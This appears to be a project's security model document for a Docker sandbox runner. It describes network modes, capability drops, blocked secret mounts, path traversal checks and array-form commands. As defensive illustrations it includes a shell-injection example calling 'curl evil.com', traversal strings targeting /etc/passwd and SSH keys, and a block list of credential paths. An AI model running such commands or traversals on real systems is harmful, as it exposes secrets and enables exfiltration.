# Sandbox Security Model

This document describes the security boundaries and policies enforced by the Buildloop Docker sandbox runner (`scripts/sandbox-run.mjs`).

## Purpose

The sandbox provides isolated execution for untrusted operations. Docker is optional for normal supervised mode and required only for L4 autonomous execution (Phase 9+). The sandbox is designed to be fail-closed: if a security check fails, execution is blocked.

## Network Isolation

| Mode | Behavior | Approval Required |
|------|----------|-------------------|
| `offline` | `--network none` — no network access | None (default) |
| `allowlist` | **Not enforced.** Bridge network, same as `full` | `network_allowlist` **and** `full_network_approved: true` |
| `full` | Unrestricted network | `full_network_approved: true` in config |

**Default:** `offline`. This is the safest mode and the default for L4 execution steps.

**Allowlist mode** records intent only. Docker cannot filter by DNS name, so the container gets unrestricted bridge networking and the runner says so. It therefore needs the same approval as `full`. For real egress control, put a filtering proxy or firewall in front of the container.

## Container Hardening

Every run uses `--cap-drop ALL`, `--security-opt no-new-privileges`, `--pids-limit 512`, and a named container that is force-removed (`docker rm -f`) if the client times out. The repo `.git` is mounted read-only (git hooks run on the host, so a writable `.git` would be a container-to-host escape), and root-level `.env*` files are shadowed with an empty tmpfs. Image references and cache volume names are restricted to plain values, so a config cannot inject Docker flags (`--privileged`) or bind host paths (`/var/run/docker.sock`). Registry hosts with a port (`host:5000/img`) are rejected by design; mirror such images to a plain name.

**Full mode** requires an explicit approval flag per run. A warning is always printed. This mode is intended only for developer testing, never for L4 defaults.

## Mount Policy

### Always Blocked

These host paths are never mounted into the container, regardless of configuration:

| Pattern | Reason |
|---------|--------|
| `.env*` | Secrets — API keys, database credentials |
| `~/.ssh/` | SSH private keys |
| `~/.aws/` | AWS credentials |
| `~/.config/` | Application secrets and tokens |
| `/var/run/docker.sock` | Container escape vector |

Blocking is enforced by pattern matching on the host path. Both absolute and relative paths are checked.

### Allowed Mounts

| Path | Mode | Purpose |
|------|------|---------|
| Project working directory | Read-write (scoped) | Primary workspace |
| `.buildloop-runs/` | Write | Log export |
| Named cache volumes | Read-write | Dependency caches (e.g., `node_modules`) |

### Path Traversal Prevention

All relative paths are resolved against the project root. Any path that resolves outside the project directory is rejected. This prevents:

- `../../etc/passwd` — system file access
- `../../.ssh/id_rsa` — secret file access via traversal
- `../../other-project/` — cross-project contamination

## Execution Model

### Dry-Run Default

The sandbox defaults to dry-run mode. In dry-run, the Docker command plan is printed but not executed. This allows inspection of the isolation policy before committing to execution.

To actually execute, pass `--execute` on the CLI or set `dryRun: false` in the API.

### Command Execution

Commands are passed as an array of strings, not as a shell string. This prevents shell interpolation attacks:

```
# Safe: array form, no interpolation
command: ["npm", "test"]

# Dangerous (NOT supported): shell form
command: "npm test && curl evil.com"
```

The Docker `run` command receives the array directly, so `$HOME`, `$(whoami)`, and backtick expressions are literal strings, not shell expansions.

### Timeout

Every sandbox execution has a timeout (default: 300 seconds, max: 28800 seconds / 8 hours). The Docker container is killed after the timeout expires.

## Logging

All sandbox logs are written under `.buildloop-runs/` in the project directory. This directory is gitignored. Logs include:

- Timestamp
- Docker command executed
- Exit code
- Stdout and stderr

No logs are written outside `.buildloop-runs/`. The log directory is validated before execution.

## Docker Unavailability

If Docker is not installed or not running:

- **Dry-run mode:** Succeeds. The command plan is printed without Docker.
- **Execute mode:** Fails with a clear informational message. No crash, no stack trace.

The sandbox never requires Docker for configuration validation or dry-run planning.

## Windows and WSL

### Path Normalization

Windows paths are normalized for Docker compatibility:
- Backslashes converted to forward slashes
- Drive letter lowercased (`C:` → `c:`)

### WSL Path Translation

When running Docker via WSL, Windows paths are translated:
- `C:\repo\project` -> `/mnt/c/repo/project`

Path translation is deterministic and tested with mocked inputs.

## Schema Contract

The sandbox config schema (`schemas/sandbox-config.schema.json`) enforces:

- `additionalProperties: false` at the root and mount levels
- `network_mode` enum: `offline`, `allowlist`, `full`
- `command` as a required non-empty string array
- Mount objects with `host_path` and `container_path` required
- `timeout_seconds` bounded between 1 and 28800

Secret mount prevention is enforced at runtime by `checkMountSecurity()`, not by schema alone, because JSON Schema cannot express path-pattern matching.

## Threat Mitigations

| Threat | Mitigation |
|--------|-----------|
| Secret leakage via mounts | Blocked mount patterns for .env, .ssh, .aws, .config, docker.sock |
| Container escape via Docker socket | Docker socket mount always blocked |
| Path traversal | All paths resolved against project root; escapes rejected |
| Shell injection | Commands as arrays, no shell interpolation |
| Network exfiltration | Default offline mode; full mode requires explicit approval |
| Unbounded execution | Timeout enforced; max 8 hours |
| Log leakage | Logs only under .buildloop-runs/ (gitignored) |
| Docker unavailable crash | Graceful degradation with informational message |

## Configuration Example

```json
{
  "command": ["npm", "test"],
  "image": "node:22-slim",
  "network_mode": "offline",
  "timeout_seconds": 300,
  "log_dir": ".buildloop-runs",
  "cache_mounts": [
    { "name": "npm-cache", "container_path": "/root/.npm" }
  ]
}
```

## Relationship to L4 Autonomous Execution

This sandbox is a prerequisite for L4 autonomous execution (Phase 9). L4 runtime is NOT implemented in this phase. The sandbox provides the isolation layer that L4 will depend on:

1. **Preflight** (`allowlist` network): Install dependencies
2. **Execution** (`offline` network): Run tests, lint, typecheck

L4 implementation requires separate explicit human approval and is gated by the Phase 9 threat model.
